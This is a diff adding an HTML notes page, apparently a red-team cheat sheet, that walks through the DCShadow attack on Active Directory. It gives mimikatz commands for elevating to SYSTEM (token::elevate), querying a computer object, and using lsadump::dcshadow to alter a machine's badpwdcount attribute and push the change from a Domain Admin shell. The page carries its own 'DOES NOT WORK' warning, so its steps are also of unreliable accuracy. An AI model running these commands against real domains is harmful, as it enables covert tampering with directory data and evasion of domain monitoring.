@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Action!</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Action!</h1><br/><span style="color:#ff0000;">WARNING: DOES NOT WORK</span><br /><br />Two shells are required:<br />   ◇ one running with <span style="text-decoration:underline;">NT AUTHORITY\SYSTEM</span> privileges<br />   <div class="codebox"><div class="codebox">PS&gt;&nbsp;Start-Process&nbsp;powershell&nbsp;-Verb&nbsp;runAs&nbsp;&nbsp;#Run&nbsp;Powershell&nbsp;as&nbsp;Administrator<br />PS&gt;&nbsp;.\mimikatz.exe</div></div><br />   <div class="codebox"><div class="codebox">mimikatz#&nbsp;token::whoami<br />mimikatz#&nbsp;token::elevate<br />mimikatz#&nbsp;token::whoami<br /><br /></div></div><br />    <a href=""><img src="images/1223-1.png" alt="images/1223-1.png" /></a><br />   ◇ one running with <code>Domain admins</code> group privileges<br />    <div class="codebox"><div class="codebox">mimikatz#&nbsp;token::whoami</div></div><br />    <a href=""><img src="images/1223-2.png" alt="images/1223-2.png" /></a><br /><br />From the shell running as <code>SYSTEM</code><br />    <div class="codebox"><div class="codebox">PS&gt;&nbsp;([adsisearcher]&quot;(&amp;(objectCategory=Computer)(name=&lt;hostname&gt;))&quot;).Findall().Properties</div></div><br />    <a href=""><img src="images/1223-3.png" alt="images/1223-3.png" /></a><br />    <a href=""><img src="images/1223-4.png" alt="images/1223-4.png" /></a><br />    <div class="codebox"><div class="codebox">mimikatz#&nbsp;lsadump::dcshadow&nbsp;/object:&lt;hostname&gt;$&nbsp;/attribute:badpwdcount&nbsp;/value=9999</div></div><br />    <a href=""><img src="images/1223-5.png" alt="images/1223-5.png" /></a><br />From the Shell running with <code>Domain Admin</code> privileges<br />    <div class="codebox"><div class="codebox">mimikatz#&nbsp;lsadump::dcshadow&nbsp;/push</div></div></div>
+</body>
+</html>
